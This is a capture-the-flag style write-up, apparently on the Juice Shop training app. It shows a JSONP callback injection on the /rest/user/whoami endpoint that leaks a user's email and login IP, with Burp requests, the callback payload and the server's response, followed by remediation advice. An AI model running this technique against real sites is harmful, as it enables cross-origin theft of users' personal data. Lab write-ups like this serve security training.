## [Sensitive Data Exposure] - [Email Leak]

## General Information

* **Difficulty Level :** ⭐⭐⭐⭐⭐ / 6

* **Date of Resolution :** 26-03-2026

---

## Vulnerability Analysis

* **Vulnerability Name :** Sensitive Data Exposure / JSONP Injection

* **Affected Components :** API Endpoint (`/rest/user/whoami`)

* **Severity  :** <span style="color:red"> Hight </span>

---

## Proof of Concept (PoC)

#### 1. Enumeration & Techniques

* **Techniques used :** Web Traffic Analysis, Parameter Injection (JSONP).
* **Tools used :** Burp Suite (Repeater) and Web Browser.

#### 2. Reproduction Steps

**Step 1 : Endpoint Identification**

Access the administrative or user profile area. The application triggers a request to `/rest/user/whoami`, which handles user session data in JSON format.

**Step 2 : Observation of Private Data Output**

By visiting the endpoint directly in the browser, the current user's sensitive data (ID, email, last login IP) is displayed. This is the exit point for private information.

``` json
{
  "user": {
    "id": 23,
    "email": "caca@juice-sh.op",
    "lastLoginIp": "10.240.56.86",
    "profileImage": "assets/public/images/uploads/23.png"
  }
}
```

**Step 3 : Traffic Interception**

Intercept the legitimate `GET` request using Burp Suite to analyze the headers and structure.

```HTTP
GET /rest/user/whoami HTTP/2
Host: ctf.juice.cyber.epitest.eu
Cookie: token=eyJhbGciOiJIUzI1Ni...
User-Agent: Mozilla/5.0 ...
```

**Step 4 : Request Manipulation (JSONP Injection)**

Modify the request by appending the `?callback=alert` parameter to the URL. If the server is misconfigured, it will wrap the JSON data in an executable function, bypassing the browser's Same-Origin Policy (SOP).

```HTTP
GET /rest/user/whoami?callback=alert HTTP/2
Host: ctf.juice.cyber.epitest.eu
```

**Step 5 : Data Leak Confirmation**

The server returns a `HTTP/2 200 OK` response, but the body is no longer raw JSON. It now starts with a JavaScript wrapper that leaks the information :

```HTTP
/**/ typeof alert === 'function' && alert({
  "user": {
    "id": 23,
    "email": "caca@juice-sh.op",
    "lastLoginIp": "10.240.56.86",
    "profileImage": "assets/public/images/uploads/23.png"
  }
});
```

---

## Risk Assessment

* **Business Impact :** Massive personal data leak. An attacker could craft highly credible phishing pages using the exact email of the user or harvest active user databases for resale, leading to reputational damage and legal non-compliance (GDPR).

* **Technical Description of the Impact :** Usually, an external site cannot read data from juice-shop.op due to SOP. By exploiting JSONP, the attacker forces the victim's browser to execute a script containing their own private data. This allows for automatic data exfiltration the moment a logged-in victim visits a malicious page controlled by the attacker.

---

## Actions & Remediation

#### Mitigation Strategies

   - Implement strict authentication token validation for every call to the /whoami endpoint.

   - Disable support for the callback parameter on all API endpoints.

#### Recommended Fixes

   - Move away from JSONP: Use standard JSON (Content-Type: application/json) and modern CORS (Cross-Origin Resource Sharing) headers.

   - Configure Access-Control-Allow-Origin to permit only trusted domains instead of allowing cross-domain script execution via padding.
